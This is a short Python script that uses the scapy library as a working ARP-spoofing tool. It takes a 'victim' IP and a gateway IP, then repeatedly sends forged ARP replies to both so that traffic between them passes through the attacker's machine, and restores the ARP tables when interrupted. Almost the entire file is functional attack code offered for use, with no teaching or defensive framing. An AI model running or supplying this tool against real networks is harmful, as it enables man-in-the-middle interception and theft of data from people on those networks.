#!/usr/bin/env python

import sys
import scapy.all as scapy
import time
import argparse

def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP (Victim address)")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP (Router address)")
    options = parser.parse_args()
    return options

def getMAC(ip):
    arpRequest = scapy.ARP(pdst=ip)
    arpBroadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_Request_Broadcast = arpBroadcast/arpRequest
    arp_AnswerdList = scapy.srp(arp_Request_Broadcast, timeout=1, verbose=False)[0]

    return arp_AnswerdList[0][1].hwsrc


def arpSpoof(targetIP, spoofIP):
    targetMAC = getMAC(targetIP)
    arpPacket = scapy.ARP(op=2, pdst=targetIP,  hwdst=targetMAC, psrc=spoofIP)
    scapy.send(arpPacket, verbose=False)

def arpRestore(dstIP, srcIP):
    targetMAC = getMAC(dstIP)
    srcMAC = getMAC(srcIP)
    arpPacket = scapy.ARP(op=2, pdst=dstIP, hwdst=targetMAC, psrc=srcIP, hwsrc=srcMAC)
    scapy.send(arpPacket, count=4, verbose=False)


sArgs = getArguments()

try:
    packetsCount = 0
    while True:
        arpSpoof(sArgs.target, sArgs.gateway)
        arpSpoof(sArgs.gateway, sArgs.target)
        packetsCount = packetsCount + 2
        print("\r--- Packets sent: " + str(packetsCount), end=""),
        time.sleep(2)
except KeyboardInterrupt:
    print("\n^^^ Resetting ARP Tables, Please wait....\n")
    arpRestore(sArgs.target, sArgs.gateway)
    arpRestore(sArgs.gateway, sArgs.target)
